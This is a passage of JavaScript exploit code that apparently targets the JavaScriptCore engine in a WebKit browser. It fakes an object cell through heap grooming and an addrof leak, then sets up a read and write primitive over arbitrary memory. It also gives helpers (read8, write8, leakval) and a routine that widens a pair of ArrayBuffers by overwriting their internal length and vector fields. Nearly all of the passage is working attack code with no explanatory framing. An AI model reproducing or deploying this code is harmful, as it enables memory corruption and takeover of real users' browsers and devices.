    const bh1=buffer(BUTTERFLY_HOLE_SIZE),bh2=buffer(BUTTERFLY_HOLE_SIZE),sep=buffer(SEPARATOR_SIZE),eh=buffer(EARLY_HOLE_SIZE),g=buffer(GUARD_SIZE),pred=buffer(PREDECESSOR_SIZE),fh=buffer(FINAL_HOLE_SIZE);
    fillRawCellPointers(pred,fakeAddress);
    keepAlive[keepIndex++]=sep;keepAlive[keepIndex++]=g;keepAlive[keepIndex++]=pred;
    emit("PREDECESSOR-FILLED",`qwords=${PREDECESSOR_SIZE/8}-fake=${hex(fakeAddress)}`);
    criticalBarrier(fakeAddress,targetAddress);
    ch.port1.postMessage(0,[bh1,bh2,eh,fh]);
    loadHistoryCritical();
    outerGraph=fillerGraph=null;
    try{history.replaceState(null,"")}catch(e){}
  }catch(e){try{clearPredecessor()}catch(x){}retrySafe=true;compositionError=e;compositionState=-1}
  reportComposition();
}
let barrierNode=null;
function ensureBarrierNode(){if(barrierNode!==null)return;try{barrierNode=document.createElement("div");barrierNode.style.cssText="position:absolute;left:-9999px;top:0";document.body.appendChild(barrierNode)}catch(e){barrierNode=null}}
function defaultCriticalBarrier(fake,target){try{const line=`CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
  if(barrierNode!==null){barrierNode.textContent=line;void barrierNode.offsetWidth}void new Blob([line],{type:"text/plain"});
  try{sessionStorage.setItem(burstKey,line)}catch(e){}}catch(e){}}
function beginComposition(){
  if(captureState===0){finishEarlySafeAttempt("ADDROF-NO-RESULT","capture-task-did-not-finish","addrof-no-result");return}
  if(captureState<0){finishEarlySafeAttempt("ADDROF-THREW",`${captureError?.name}:`+String(captureError?.message).slice(0,80),"addrof-threw");return}
  const a0=pointerFromWords(capturedWords,0),b0=pointerFromWords(capturedWords,4),a1=pointerFromWords(capturedWords,8),b1=pointerFromWords(capturedWords,12);
  const repeated=a0===a1&&b0===b1,distinct=a0!==b0,plausible=plausibleCell(a0)&&plausibleCell(b0)&&plausibleCell(a1)&&plausibleCell(b1);
  const fakeChars=copiedLength>=8?copiedLength-8:0,sourceCovered=fakeChars*2<=CARRIER_BYTES;
  const requiredSourceBytes=fakeChars*2,minimumSlots=Math.ceil(requiredSourceBytes/8);
  emit("ADDROF-COVERAGE",`chars=${copiedLength}-need=${requiredSourceBytes}-have=${CARRIER_BYTES}-minSlots=${minimumSlots}`);
  emit("ADDROF-RETURNED",REVISION);emit("ADDROF-COPY",`chars=${copiedLength}-covered=${sourceCovered}`);
  emit("ADDROF-POINTERS",`HOST=${hex(a0)}-TARGET=${hex(b0)}-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`);
  if(!(repeated&&distinct&&plausible&&sourceCovered)){
    if(!sourceCovered&&growCarrier(minimumSlots))emit("TRAEGER-WACHSEN",`slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
    finishEarlySafeAttempt("ADDROF-FAIL",`repeat=${repeated}-distinct=${distinct}-plausible=${plausible}-covered=${sourceCovered}-minSlots=${minimumSlots}`,"addrof-validation");
    return;
  }
  capturedString=capturedWords=preparedSymbolObject=leakedScope=getterCarrier=null;
  try{if(typeof globalThis.gc==="function")globalThis.gc()}catch(e){}
  hostAddress=a0;targetAddress=b0;
  targetAddressHigh=Math.floor(targetAddress/0x100000000);targetAddressLow=targetAddress-targetAddressHigh*0x100000000;
  if(targetAddressHigh<0||targetAddressHigh>0xffff||targetAddressLow<0||targetAddressLow>0xffffffff||Math.floor(targetAddressLow)!==targetAddressLow||targetAddressLow+targetAddressHigh*0x100000000!==targetAddress){finishEarlySafeAttempt("TARGET-ADDRESS-FAIL",`target=${hex(targetAddress)}`,"target-address");return}
  fakeAddress=hostAddress+0x10;
  if(!plausibleCell(fakeAddress)||fakeAddress-hostAddress!==0x10){finishEarlySafeAttempt("FAKE-ADDRESS-FAIL",`host=${hex(hostAddress)}`,"fake-address");return}
  emit("FAKE-ADDRESS",`host=${hex(hostAddress)}-fake=${hex(fakeAddress)}-delta=0x10`);
  runGroomAndLoad();
}
function reportComposition(){
  if(compositionState<0){emit(retrySafe?"SSV-PLACEMENT-MISS":"LOAD-THREW",`${compositionError?.name}:`+String(compositionError?.message).slice(0,80));if(!retrySafe)failed();else scheduleSafeRetry("placement-throw");return}
  if(compositionState===2){emit("NORMAL-CLONE-MISS","known-reference-returned=true");scheduleSafeRetry("normal-clone-miss");return}
  if(compositionState===3){emit(identityResult===-1?"CARRIER-IDENTITY-FAIL":zeroHeaderMiss?"ZERO-HEADER-MISS":retrySafe?"COMPOSITION-LENGTH-MISS":"VALIDATION-MISMATCH",`rw=${rwHeaderOK}-holder=${holderHeaderOK}-function=${functionHeaderOK}-native=${nativeExecutableHeaderOK}-repeat=${pointersRepeated}-safe=${retrySafe}-identity=${identityResult}-hex=${dumpHex(rwHeader,CELL_BYTES)}`);if(!retrySafe)failed();else scheduleSafeRetry(zeroHeaderMiss?"zero-header-miss":"composition-length-mismatch");return}
  if(compositionState===0){emit("NO-RESULT","critical-load-did-not-finish");failed();return}
  emit("SSV-RETURNED-CLEARED",`length=${compositionLength}-predecessor-cleared=true`);
  emit("RW-CARRIER",`sid=${hex(profile.carrierSID)}-vector=${hex(rwOriginalVector)}-length=${hex(uint32At(rwHeader,0x18))}-mode=${hex(profile.carrierMode)}`);
  emit("HOLDER",`cell=${hex(targetAddress)}-textarea=${hex(anchorElementAddress)}-markerA=${hex(markerAAddress)}-markerB=${hex(markerBAddress)}`);
  emit("JSC-PROFILE",`u8=${hex(profile.carrierType)}-u8flags=${hex(profile.carrierFlags)}-mode=${hex(profile.carrierMode)}-obj=${hex(profile.holderType)}-objflags=${hex(profile.holderFlags)}-fn=${hex(profile.functionType)}-fnflags=${hex(profile.functionFlags)}-nx=${hex(profile.nativeExecType)}-nxflags=${hex(profile.nativeExecFlags)}`);
  emit("RW-HEADER-HEX",dumpHex(rwHeader,CELL_BYTES));
  const leakPass=rwHeaderOK&&holderHeaderOK&&functionHeaderOK&&nativeExecutableHeaderOK&&pointersRepeated&&restoreObserved&&compositionLength===EXPECTED_LENGTH&&liveCandidate!==null;
  if(!leakPass){emit("READ-PRIMITIVE-MISMATCH",`rw=${rwHeaderOK}-holder=${holderHeaderOK}-function=${functionHeaderOK}-native=${nativeExecutableHeaderOK}-repeat=${pointersRepeated}-restore=${restoreObserved}`);liveCandidate=null;failed();return}
  emit("READ-PRIMITIVE-PASS","arbitrary-read-established-firmware-offsets-asserted=none");
  try{history.replaceState(null,"")}catch(e){}
  stopped=true;running=false;
  const r=settleResolve;settleResolve=null;settleReject=null;
  if(r!==null)r(buildCarrier());
}
function buildCarrier(){
  profile.cellSize=0x20;
  return {
    aim(a){if(liveCandidate===null)throw new Error("core.aim: carrier is no longer live");if(!plausibleAddress(a))throw new RangeError(`core.aim: implausible ${a}`);aimCarrier(liveCandidate,a)},
    restore(){if(liveCandidate===null)throw new Error("core.restore: carrier is no longer live");restoreCarrier(liveCandidate)},
    get view(){return rwView},windowBytes:RW_BUFFER_SIZE,
    holder:targetHolder,holderAddress:targetAddress,leakSlotOffset:LEAK_SLOT_OFFSET,leakSlotAddress:targetAddress+LEAK_SLOT_OFFSET,
    setLeakSlot(v){targetHolder.q2=v},clearLeakSlot(){targetHolder.q2=markerObjectA},
    anchorObject:markerObjectA,anchorObjectAddress:markerAAddress,textarea:anchorElement,textareaAddress:anchorElementAddress,
    profile,attempts:attemptNumber,validate:plausibleAddress,hostAddress,fakeAddress,
    assertHome(){if(liveCandidate===null||rwView===null||targetView===null||rwMirror===null)return false;return rwView[0]===0x3c&&rwMirror[0]===0x3c&&targetView[0]===0xa5}
  };
}
function establishPrimitive(options){
  const opts=options||{};
  if(fakeReleased)return Promise.reject(new Error("core: fake cell already released"));
  if(running)return Promise.reject(new Error("core: already running"));
  if(typeof BigInt!=="function"||typeof MessageChannel!=="function"||typeof Symbol!=="function"||typeof history==="undefined"||typeof history.replaceState!=="function")return Promise.reject(new Error("core: unsupported browser"));
  onEvent=typeof opts.onEvent==="function"?opts.onEvent:null;
  criticalBarrier=typeof opts.beforeCriticalLoad==="function"?opts.beforeCriticalLoad:defaultCriticalBarrier;
  if(criticalBarrier===defaultCriticalBarrier)ensureBarrierNode();
  attemptCeiling=typeof opts.maxAttempts==="number"&&opts.maxAttempts>0?opts.maxAttempts:0;
  running=true;stopped=false;attemptNumber=1;
  try{sessionStorage.removeItem(attemptKey)}catch(e){}
  return new Promise((res,rej)=>{settleResolve=res;settleReject=rej;startAttempt()});
}
function releaseFakeCell(){
  const rep={released:["liveCandidate","fakeHost","lengthWord","getterCarrier","leakedScope","preparedSymbolObject","capturedString","capturedWords","predecessorWords","outerGraph","fillerGraph","referenceTarget","keepAlive"],alreadyReleased:fakeReleased,hostAddress,fakeAddress,historyCleared:false};
  if(fakeReleased)return rep;
  liveCandidate=fakeHost=lengthWord=getterCarrier=leakedScope=preparedSymbolObject=capturedString=capturedWords=predecessorWords=outerGraph=fillerGraph=referenceTarget=keepAlive=null;
  try{history.replaceState(null,"");rep.historyCleared=history.state===null}catch(e){}
  fakeReleased=true;stopped=true;running=false;retryScheduled=false;
  return rep;
}
function fakeCellReleased(){return fakeReleased}
function carrierHeaderCopy(){return rwHeader.slice(0,CELL_BYTES)}
function carrierHomeVector(){return rwOriginalVector}
return {establishPrimitive,releaseFakeCell,fakeCellReleased,carrierHeaderCopy,carrierHomeVector};
})();

/* ============ mem.js ============ */
const Mem = (function(){
const { releaseFakeCell, fakeCellReleased, carrierHeaderCopy, carrierHomeVector } = Core;
let carrier=null;
function toI64(x){
  if(x instanceof int64)return x;
  if(typeof x==="number"){if(!Number.isFinite(x)||Math.floor(x)!==x||x<0)throw new TypeError(`mem: bad numeric address ${x}`);const hi=Math.floor(x/0x100000000);return new int64(x-hi*0x100000000,hi)}
  if(x!==null&&typeof x==="object"&&"low" in x)return new int64(x.low,"hi" in x?x.hi:x.high);
  throw new TypeError("mem: bad address");
}
function addrNumber(x){const a=toI64(x);if(a.hi>0xffff)throw new RangeError(`mem: non-canonical 0x${a.toString()}`);return a.hi*0x100000000+a.low}
function aimFor(a,size){const ad=addrNumber(a);if(size>carrier.windowBytes)throw new RangeError(`mem: ${size} > ${carrier.windowBytes}`);carrier.aim(ad);return ad}
function valueLow32(v,who){if(typeof v==="number"){if(!Number.isFinite(v)||Math.floor(v)!==v)throw new TypeError(`${who}: non-int ${v}`);return v>>>0}if(v instanceof int64)return v.low>>>0;if(v!==null&&typeof v==="object"&&"low" in v)return toI64(v).low>>>0;throw new TypeError(`${who}: must be number or int64`)}
function read1(a){aimFor(a,1);try{return carrier.view[0]}finally{carrier.restore()}}
function read2(a){aimFor(a,2);try{const v=carrier.view;return v[0]|(v[1]<<8)}finally{carrier.restore()}}
function read4(a){aimFor(a,4);try{const v=carrier.view;return (v[0]|(v[1]<<8)|(v[2]<<16)|(v[3]<<24))>>>0}finally{carrier.restore()}}
function read8(a){let lo,hi;aimFor(a,8);try{const v=carrier.view;lo=(v[0]|(v[1]<<8)|(v[2]<<16)|(v[3]<<24))>>>0;hi=(v[4]|(v[5]<<8)|(v[6]<<16)|(v[7]<<24))>>>0}finally{carrier.restore()}return new int64(lo,hi)}
function write1(a,v){const x=valueLow32(v,"mem.write1")&0xff;aimFor(a,1);try{carrier.view[0]=x}finally{carrier.restore()}}
function write2(a,v){const x=valueLow32(v,"mem.write2")&0xffff;aimFor(a,2);try{const w=carrier.view;w[0]=x&0xff;w[1]=(x>>>8)&0xff}finally{carrier.restore()}}
function write4(a,v){const x=valueLow32(v,"mem.write4");aimFor(a,4);try{const w=carrier.view;w[0]=x&0xff;w[1]=(x>>>8)&0xff;w[2]=(x>>>16)&0xff;w[3]=(x>>>24)&0xff}finally{carrier.restore()}}
function write8(a,v){let lo,hi;
  if(v instanceof int64){lo=v.low>>>0;hi=v.hi>>>0}
  else if(typeof v==="number"){if(!Number.isFinite(v)||Math.floor(v)!==v)throw new TypeError(`mem.write8: non-int ${v}`);
    if(v<0){if(v<-0x80000000)throw new RangeError(`mem.write8: ${v} below int32`);lo=v>>>0;hi=0xffffffff}
    else if(v<=0xffffffff){lo=v>>>0;hi=0}
    else throw new RangeError(`mem.write8: ${v} > 32 bits`)}
  else if(v!==null&&typeof v==="object"&&"low" in v){const n=toI64(v);lo=n.low;hi=n.hi}
  else throw new TypeError("mem.write8: bad value");
  aimFor(a,8);try{const w=carrier.view;w[0]=lo&0xff;w[1]=(lo>>>8)&0xff;w[2]=(lo>>>16)&0xff;w[3]=(lo>>>24)&0xff;w[4]=hi&0xff;w[5]=(hi>>>8)&0xff;w[6]=(hi>>>16)&0xff;w[7]=(hi>>>24)&0xff}finally{carrier.restore()}}
function leakval(obj){
  if(obj===null||(typeof obj!=="object"&&typeof obj!=="function"))throw new TypeError("mem.leakval: not object");
  carrier.setLeakSlot(obj);let lo,hi;
  try{aimFor(carrier.leakSlotAddress,8);try{const v=carrier.view;lo=(v[0]|(v[1]<<8)|(v[2]<<16)|(v[3]<<24))>>>0;hi=(v[4]|(v[5]<<8)|(v[6]<<16)|(v[7]<<24))>>>0}finally{carrier.restore()}}finally{carrier.clearLeakSlot()}
  if(hi>0xffff||(lo===0&&hi===0)||(lo&7)!==0)throw new Error(`mem.leakval: implausible cell 0x${new int64(lo,hi).toString()}`);
  return new int64(lo,hi);
}
const WORKER_BUFFER_SIZE=0x100,PAIR_IDENT_OFFSET=0x20,MAIN_IDENT_OFFSET=0x40,PAIR_HEADER_BYTES=0x20,HOME_BYTE=0x3c,WORKER_LENGTH_MAX=0xffffffff;
const mainMagic=new Uint8Array([0x63,0x9e,0x1f,0x29,0xd2,0x84,0x0b,0x5c]);
const workerMagic=new Uint8Array([0x9e,0x37,0x79,0xb9,0x7f,0x4a,0x7c,0x15]);
const workerHeader=new Uint8Array(PAIR_HEADER_BYTES),identityBytes=new Uint8Array(8),workerOriginalVector=new Uint8Array(8),workerOriginalLength=new Uint8Array(4);
const pairScratch=new ArrayBuffer(8),pairScratchBytes=new Uint8Array(pairScratch),pairScratchWords=new Uint32Array(pairScratch);
let mainView=null,workerBuffer=null,workerView=null,workerMirror=null,pairVectorOffset=-1;
const retained=[];
const pairStatus={state:"not-attempted",promoted:false,committed:false,rolledBack:false,rollbackClean:null,fallback:false,stage:"not-attempted",failedAt:null,error:null,vectorOffset:-1,lengthOffset:-1,modeOffset:-1,butterflyOffset:-1,mainAddress:null,mainVector:null,mainRecordVector:null,mainWindow:-1,mainCellFromFakeSlot:null,mainIdentity:null,mainAtHome:null,workerAddress:null,workerVector:null,workerButterfly:null,workerWindow:-1,workerLength:-1,workerIdentity:null,structureID:-1,mode:-1,leakvalAgrees:false,fakeAddress:null,fakeButterfly:null,released:[]};
function u32At(b,o){return (b[o]|(b[o+1]<<8)|(b[o+2]<<16)|(b[o+3]<<24))>>>0}
function low48At2(b,o){return b[o]+b[o+1]*0x100+b[o+2]*0x10000+b[o+3]*0x1000000+b[o+4]*0x100000000+b[o+5]*0x10000000000}
function canonical48(b,o){return b[o+6]===0&&b[o+7]===0}
function sameB(a,b,c){for(let i=0;i<c;++i)if(a[i]!==b[i])return false;return true}
function hexOf(b,c){let o="";for(let i=0;i<c;++i)o+=(b[i]&0xff).toString(16).padStart(2,"0");return o}
function pairAim(a){const h=Math.floor(a/0x100000000);pairScratchWords[0]=a-h*0x100000000;pairScratchWords[1]=h;for(let i=0;i<8;++i)mainView[pairVectorOffset+i]=pairScratchBytes[i]}
function pairRestore(){for(let i=0;i<8;++i)mainView[pairVectorOffset+i]=workerOriginalVector[i]}
function buildPairCarrier(fake){
  const validate=fake.validate;
  return {
    aim(a){if(mainView===null||workerView===null)throw new Error("mem.pair.aim: dropped");if(!validate(a))throw new RangeError(`mem.pair.aim: ${a}`);pairAim(a)},
    restore(){if(mainView===null)throw new Error("mem.pair.restore: dropped");pairRestore()},
    get view(){return workerView},windowBytes:WORKER_BUFFER_SIZE,
    holder:fake.holder,holderAddress:fake.holderAddress,leakSlotOffset:fake.leakSlotOffset,leakSlotAddress:fake.leakSlotAddress,
    setLeakSlot:fake.setLeakSlot,clearLeakSlot:fake.clearLeakSlot,anchorObject:fake.anchorObject,anchorObjectAddress:fake.anchorObjectAddress,
    textarea:fake.textarea,textareaAddress:fake.textareaAddress,profile:fake.profile,attempts:fake.attempts,validate,
    hostAddress:fake.hostAddress,fakeAddress:fake.fakeAddress,pair:pairStatus,
    assertHome(){if(workerView===null||workerMirror===null)return false;return workerView[0]===HOME_BYTE&&workerMirror[0]===HOME_BYTE}
  };
}
function brokenCarrier(why){const die=()=>{throw new Error("mem: primitive disabled -- rollback did not verify ("+why+")")};
  return {aim:die,restore:die,setLeakSlot:die,clearLeakSlot:die,get view(){return die()},get windowBytes(){return die()},get leakSlotAddress(){return die()},validate:()=>false,assertHome:()=>false,profile:null,pair:pairStatus}}
function proveMagic(note,who,slot,at,expected,context){
  const target=toI64(at),record={at:target,expected:hexOf(expected,8),found:null,pass:false};
  pairStatus[slot]=record;
  readInto(identityBytes,at,8);record.found=hexOf(identityBytes,8);record.pass=sameB(identityBytes,expected,8);
  note(`PAIR-IDENTITY-${who.toUpperCase()}`,`at=0x${target.toString()}-found=${record.found}-expected=${record.expected}-pass=${record.pass}-${context}`);
  if(!record.pass)throw new Error(`mem.promote: ${who} identity failed -- read ${record.found} at 0x${target.toString()}, expected ${record.expected} (${context})`);
  return record;
}
function readInto(dest,addr,count){const base=addrNumber(addr);let done=0;while(done<count){const chunk=Math.min(count-done,carrier.windowBytes);aimFor(base+done,chunk);try{for(let i=0;i<chunk;++i)dest[done+i]=carrier.view[i]}finally{carrier.restore()}done+=chunk}return dest}
function readIntoPair(dest,addr,count){const base=addrNumber(addr);let done=0;while(done<count){const chunk=Math.min(count-done,carrier.windowBytes);aimFor(base+done,chunk);try{for(let i=0;i<chunk;++i)dest[done+i]=carrier.view[i]}finally{carrier.restore()}done+=chunk}return dest}
function promoteToRealPair(onEvent){
  const note=(tag,detail)=>{pairStatus.stage=tag;if(typeof onEvent==="function")try{onEvent(tag,detail===undefined?"":String(detail))}catch(e){}};
  if(pairStatus.promoted)throw new Error("mem.promote: already promoted");
  if(carrier===null||typeof carrier.aim!=="function")throw new TypeError("mem.promote: no carrier");
  if(fakeCellReleased())throw new Error("mem.promote: core already released fake cell");
  const fake=carrier,profile=fake.profile;
  if(!profile||typeof profile.vectorOffset!=="number"||typeof profile.butterflyOffset!=="number"||typeof profile.inlineSlotOffset!=="number")throw new TypeError("mem.promote: carrier has no layout profile");
  if(typeof fake.hostAddress!=="number"||!fake.validate(fake.hostAddress)||typeof fake.fakeAddress!=="number"||!fake.validate(fake.fakeAddress)||fake.fakeAddress-fake.hostAddress!==profile.inlineSlotOffset)throw new TypeError(`mem.promote: fake cell address unusable (host=${fake.hostAddress} fake=${fake.fakeAddress})`);
  const VECTOR_OFF=profile.vectorOffset,LENGTH_OFF=VECTOR_OFF+8,MODE_OFF=LENGTH_OFF+4,BUTTERFLY_OFF=profile.butterflyOffset;
  pairStatus.vectorOffset=VECTOR_OFF;pairStatus.lengthOffset=LENGTH_OFF;pairStatus.modeOffset=MODE_OFF;pairStatus.butterflyOffset=BUTTERFLY_OFF;
  let committed=false,rebound=false;
  try{
    note("PAIR-BEGIN",`window=${fake.windowBytes}-vector=+${VECTOR_OFF}-length=+${LENGTH_OFF}-mode=+${MODE_OFF}`);
    const mainRecord=carrierHeaderCopy(),mainHomeVector=carrierHomeVector();
    if(!(mainRecord instanceof Uint8Array)||mainRecord.length<PAIR_HEADER_BYTES)throw new Error("mem.promote: carrier record wrong shape");
    const recordVector=low48At2(mainRecord,VECTOR_OFF);
    pairStatus.mainVector=toI64(mainHomeVector);pairStatus.mainRecordVector=toI64(recordVector);pairStatus.mainWindow=u32At(mainRecord,LENGTH_OFF);pairStatus.structureID=u32At(mainRecord,0);
    note("PAIR-MAIN-RECORD",`home=0x${pairStatus.mainVector.toString()}-record=0x${pairStatus.mainRecordVector.toString()}-len=${pairStatus.mainWindow}-mode=${mainRecord[MODE_OFF]}-sid=0x${(pairStatus.structureID>>>0).toString(16)}`);
    if(recordVector!==mainHomeVector)throw new Error(`mem.promote: vectorOffset != home (record 0x${pairStatus.mainRecordVector.toString()} vs home 0x${pairStatus.mainVector.toString()})`);
    if(!fake.validate(mainHomeVector)||mainHomeVector%8!==0)throw new Error(`mem.promote: implausible home vector 0x${pairStatus.mainVector.toString()}`);
    if(pairStatus.mainWindow!==fake.windowBytes)throw new Error(`mem.promote: record m_length (${pairStatus.mainWindow}) != window (${fake.windowBytes})`);
    mainView=fake.view;retained.push(mainView);
    if(!(mainView instanceof Uint8Array)||mainView.length!==fake.windowBytes||MAIN_IDENT_OFFSET+8>fake.windowBytes)throw new Error("mem.promote: carrier view != description");
    pairStatus.fakeAddress=toI64(fake.fakeAddress);pairStatus.fakeButterfly=read8(fake.fakeAddress+BUTTERFLY_OFF);
    note("PAIR-FAKE-BUTTERFLY",`host=0x${toI64(fake.hostAddress).toString()}-fake=0x${pairStatus.fakeAddress.toString()}-butterfly=0x${pairStatus.fakeButterfly.toString()}`);
    workerBuffer=new ArrayBuffer(WORKER_BUFFER_SIZE);workerView=new Uint8Array(workerBuffer);workerMirror=new Uint8Array(workerBuffer);
    retained.push(workerBuffer,workerView,workerMirror);workerMirror[0]=HOME_BYTE;
    for(let i=0;i<8;++i)workerMirror[PAIR_IDENT_OFFSET+i]=workerMagic[i];
    if(workerView[0]!==HOME_BYTE)throw new Error("mem.promote: workerView != workerMirror");
    for(let i=0;i<8;++i)mainView[MAIN_IDENT_OFFSET+i]=mainMagic[i];
    for(let i=0;i<8;++i)if(mainView[MAIN_IDENT_OFFSET+i]!==mainMagic[i])throw new Error("mem.promote: main magic did not read back");
    const mainAddr=addrNumber(leakval(mainView)),workerAddr=addrNumber(leakval(workerView));
    pairStatus.mainAddress=toI64(mainAddr);pairStatus.workerAddress=toI64(workerAddr);
    note("PAIR-CELLS",`main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}`);
    if(mainAddr===workerAddr)throw new Error("mem.promote: same cell");
    if(mainAddr%0x10!==0||workerAddr%0x10!==0)throw new Error("mem.promote: cell not atom-aligned");
    const fromFakeSlot=read8(fake.fakeAddress+VECTOR_OFF);pairStatus.mainCellFromFakeSlot=fromFakeSlot;
    note("PAIR-MAIN-CELL",`fake-m_vector=0x${fromFakeSlot.toString()}-leakval=0x${pairStatus.mainAddress.toString()}-at=0x${toI64(fake.fakeAddress+VECTOR_OFF).toString()}`);
    if(fromFakeSlot.low!==pairStatus.mainAddress.low||fromFakeSlot.hi!==pairStatus.mainAddress.hi)throw new Error(`mem.promote: main CELL identity failed -- fake m_vector 0x${fromFakeSlot.toString()}, leakval says 0x${pairStatus.mainAddress.toString()}`);
    proveMagic(note,"main","mainIdentity",mainHomeVector+MAIN_IDENT_OFFSET,mainMagic,`home=0x${pairStatus.mainVector.toString()}-cell=0x${pairStatus.mainAddress.toString()}-offset=+0x${MAIN_IDENT_OFFSET.toString(16)}`);
    readInto(workerHeader,workerAddr,PAIR_HEADER_BYTES);
    const workerVector=low48At2(workerHeader,VECTOR_OFF),workerButterfly=low48At2(workerHeader,BUTTERFLY_OFF);
    pairStatus.mode=workerHeader[MODE_OFF];pairStatus.workerWindow=u32At(workerHeader,LENGTH_OFF);
    pairStatus.workerVector=toI64(workerVector);pairStatus.workerButterfly=toI64(workerButterfly);
    note("PAIR-WORKER-HEADER",`sid=0x${u32At(workerHeader,0).toString(16)}-vector=0x${pairStatus.workerVector.toString()}-len=${pairStatus.workerWindow}-mode=${pairStatus.mode}-butterfly=0x${pairStatus.workerButterfly.toString()}`);
    const gate=u32At(workerHeader,0)===pairStatus.structureID&&(workerHeader[7]===0||workerHeader[7]===1)&&pairStatus.workerWindow===WORKER_BUFFER_SIZE&&workerHeader[MODE_OFF]===mainRecord[MODE_OFF]&&workerHeader[MODE_OFF+1]===0&&workerHeader[MODE_OFF+2]===0&&workerHeader[MODE_OFF+3]===0&&canonical48(workerHeader,BUTTERFLY_OFF)&&workerButterfly>0x100000000&&workerButterfly%8===0&&canonical48(workerHeader,VECTOR_OFF)&&fake.validate(workerVector)&&workerVector%8===0&&workerVector!==mainHomeVector;
    if(!gate)throw new Error("mem.promote: header gate failed");
    proveMagic(note,"worker","workerIdentity",workerVector+PAIR_IDENT_OFFSET,workerMagic,`vector=0x${pairStatus.workerVector.toString()}-cell=0x${pairStatus.workerAddress.toString()}-offset=+0x${PAIR_IDENT_OFFSET.toString(16)}`);
    note("PAIR-IDENTITY","main-cell=proved-main-buffer=proved-worker=proved");
    for(let i=0;i<8;++i)workerOriginalVector[i]=workerHeader[VECTOR_OFF+i];
    for(let i=0;i<4;++i)workerOriginalLength[i]=workerHeader[LENGTH_OFF+i];
    note("PAIR-COMMIT",`main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}-next=aim-without-restore`);
    aimFor(workerAddr,PAIR_HEADER_BYTES);committed=true;pairStatus.committed=true;
    for(let i=0;i<4;++i)mainView[LENGTH_OFF+i]=0xff;pairStatus.workerLength=workerView.length;
    if(pairStatus.workerLength!==WORKER_LENGTH_MAX)throw new Error(`mem.promote: m_length write did not land (${pairStatus.workerLength})`);
    if(workerMirror.length!==WORKER_BUFFER_SIZE)throw new Error("mem.promote: mirror widened too");
    if(workerView[0]!==HOME_BYTE)throw new Error("mem.promote: worker no longer sees own buffer");
    if(mainView[MODE_OFF]!==workerHeader[MODE_OFF]||mainView[MODE_OFF+1]!==0||mainView[MODE_OFF+2]!==0||mainView[MODE_OFF+3]!==0)throw new Error("mem.promote: m_mode disturbed");
    for(let i=0;i<8;++i)if(mainView[VECTOR_OFF+i]!==workerOriginalVector[i])throw new Error("mem.promote: worker m_vector moved during widening");
    note("PAIR-WIDENED",`length=0x${WORKER_LENGTH_MAX.toString(16)}-mode=0x${pairStatus.mode.toString(16)}`);
    pairVectorOffset=VECTOR_OFF;carrier=buildPairCarrier(fake);rebound=true;
    readInto(identityBytes,workerVector+PAIR_IDENT_OFFSET,8);
    if(!sameB(identityBytes,workerMagic,8))throw new Error(`mem.promote: read through pair returned ${hexOf(identityBytes,8)}, expected ${hexOf(workerMagic,8)}`);
    write8(workerVector+PAIR_IDENT_OFFSET,new int64(0x0d0c0b0a,0x04030201));
    const back=[0x0a,0x0b,0x0c,0x0d,0x01,0x02,0x03,0x04];
    for(let i=0;i<8;++i)if(workerMirror[PAIR_IDENT_OFFSET+i]!==back[i])throw new Error(`mem.promote: write through pair failed at byte ${i}`);
    for(let i=0;i<8;++i)workerMirror[PAIR_IDENT_OFFSET+i]=workerMagic[i];
    const workerAgain=addrNumber(leakval(workerView));pairStatus.leakvalAgrees=workerAgain===workerAddr;
    if(!pairStatus.leakvalAgrees)throw new Error(`mem.promote: leakval through pair disagrees (0x${toI64(workerAgain).toString()} vs 0x${pairStatus.workerAddress.toString()})`);
    const mv=read8(mainAddr+VECTOR_OFF);
    if(mv.low!==pairStatus.workerAddress.low||mv.hi!==pairStatus.workerAddress.hi)throw new Error(`mem.promote: main.m_vector 0x${mv.toString()}, expected worker cell 0x${pairStatus.workerAddress.toString()}`);
    if(read4(mainAddr+LENGTH_OFF)!==fake.windowBytes)throw new Error("mem.promote: main own m_length disturbed");
    note("PAIR-REPROVED",`main-m_vector=0x${mv.toString()}-leakval=0x${toI64(workerAgain).toString()}`);
    note("PAIR-RELEASE","next=release-fake-cell-and-debris");
    const rel=releaseFakeCell();pairStatus.released=rel.released;pairStatus.historyCleared=!!rel.historyCleared;
    if(!fakeCellReleased())throw new Error("mem.promote: core did not release fake cell");
    if(fake.assertHome()!==false)throw new Error("mem.promote: core carrier still reports live");
    pairStatus.promoted=true;pairStatus.state="pair";pairStatus.error=null;
    note("PAIR-UP",`main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}-home=0x${pairStatus.mainVector.toString()}-mode=0x${pairStatus.mode.toString(16)}-sid=0x${pairStatus.structureID.toString(16)}-released=${pairStatus.released.length}-history-cleared=${pairStatus.historyCleared}`);
    return pairStatus;
  }catch(error){
    pairStatus.failedAt=pairStatus.stage;pairStatus.error=`${error&&error.name}: ${String(error&&error.message)}`;
    let clean=true;
    if(committed){pairStatus.rolledBack=true;
      try{for(let i=0;i<8;++i)mainView[VECTOR_OFF+i]=workerOriginalVector[i];for(let i=0;i<4;++i)mainView[LENGTH_OFF+i]=workerOriginalLength[i]}catch(e){clean=false}
      try{fake.restore()}catch(e){clean=false}
      try{if(!(workerView.length===WORKER_BUFFER_SIZE&&workerMirror.length===WORKER_BUFFER_SIZE&&workerView[0]===HOME_BYTE&&fake.assertHome()===true))clean=false}catch(e){clean=false}
      pairStatus.rollbackClean=clean;
    }
    try{pairStatus.mainAtHome=fake.assertHome()}catch(e){pairStatus.mainAtHome=null}
    pairStatus.promoted=false;pairStatus.fallback=true;pairStatus.state=committed&&!clean?"broken":"fake";
    if(pairStatus.state==="broken")carrier=brokenCarrier(pairStatus.error);else if(rebound)carrier=fake;
    pairVectorOffset=-1;workerView=workerMirror=workerBuffer=mainView=null;
    note("PAIR-FALLBACK",`state=${pairStatus.state}-committed=${committed}-rollback-clean=${pairStatus.rollbackClean}-main-at-home=${pairStatus.mainAtHome}-at=${pairStatus.failedAt}-${pairStatus.error}`);
    throw error;
  }
}
function installWindowP(c,options){
  if(!c||typeof c.aim!=="function")throw new TypeError("mem: not a carrier");
  carrier=c;
  const prim={read1,read2,read4,read8,write1,write2,write4,write8,leakval};
  globalThis.p=prim;
  const opts=options||{};
